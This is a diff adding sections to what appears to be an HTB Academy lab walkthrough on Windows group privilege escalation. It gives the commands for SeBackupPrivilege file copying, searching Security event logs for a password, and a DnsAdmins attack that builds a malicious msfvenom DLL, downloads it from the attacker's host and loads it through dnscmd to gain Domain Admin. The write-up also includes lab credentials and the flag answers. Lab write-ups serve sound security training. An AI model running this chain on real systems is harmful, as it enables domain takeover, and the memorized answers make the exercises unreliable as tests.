@@ -210,5 +210,93 @@ type 'C:\TakeOwn\flag.txt'
 Results: 1m_th3_f1l3_0wn3r_n0W!
 
 
-### Windows Group Privileges
+## Windows Group Privileges
 
+RDP to  with user "svc_backup" and password "HTB_@cademy_stdnt!". Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
+
+```
+xfreerdp /v:10.129.43.42 /u:svc_backup /p:HTB_@cademy_stdnt! /cert:ignore
+
+# Check privs and group memberships:
+whoami /priv
+whoami /groups
+
+# If SeBackupPrivilege is present, double check if it is enabled:
+Get-SeBackupPrivilege
+
+# If disabled, enable it (and check it back):
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+whoami /priv
+
+# Copy the file
+Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
+
+type flag.txt
+```
+
+Results: Car3ful_w1th_gr0up_m3mberSh1p! 
+
+
+**RDP to  with user "logger" and password "HTB_@cademy_stdnt!" Using the methods demonstrated in this section find the password for the user mary.**
+
+```
+xfreerdp /v:10.129.43.43 /u:logger /p:HTB_@cademy_stdnt! /cert:ignore
+
+# Confirming Group Membership
+net localgroup "Event Log Readers"
+
+# Also
+whoami /groups
+
+# Searching Security Logs Using wevtutil (Windows Event Utility, used for querying and managing event logs):
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+# qe Security → Queries the Security event log.
+# /rd:true → Reads events in reverse order (starting from the most recent).
+# /f:text  → Formats the output in plain text (instead of XML or JSON).
+# | Select-String "/user" → Pipes (`|`) the output to `Select-String`, which **searches for lines containing** `"/user"`.
+```
+
+Results:  W1ntergreen_gum_2021!
+
+
+**RDP to  with user "netadm" and password "HTB_@cademy_stdnt!". Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt**
+
+```
+xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! /cert:ignore
+
+# Go to c:\Tools and you directly will see the adduser.dll. Otherwise, to generate it:
+
+
+# Generating Malicious DLL to add a user to the domain admins group using msfvenom from your attacking machine:
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+
+# Starting Local HTTP Server: 
+python3 -m http.server 7777
+
+# Downloading File to Target machine:
+wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
+
+# Loading this DLL as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this. 
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+# With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
+wmic useraccount where name="netadm" get sid
+sc.exe sdshow DNS
+
+
+# Stopping and starting the DNS Service
+sc.exe stop dns
+sc.exe start dns
+
+# Confirming Group Membership
+net group "Domain Admins" /dom
+
+# However, your session is still running at `Medium Mandatory Level`, which indicates you haven’t fully inherited the **Domain Admin** privileges yet.
+logoff
+
+# And when you connect back, you will be Domain Admin.
+type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
+```
+
+Results: Dll_abus3_ftw!  
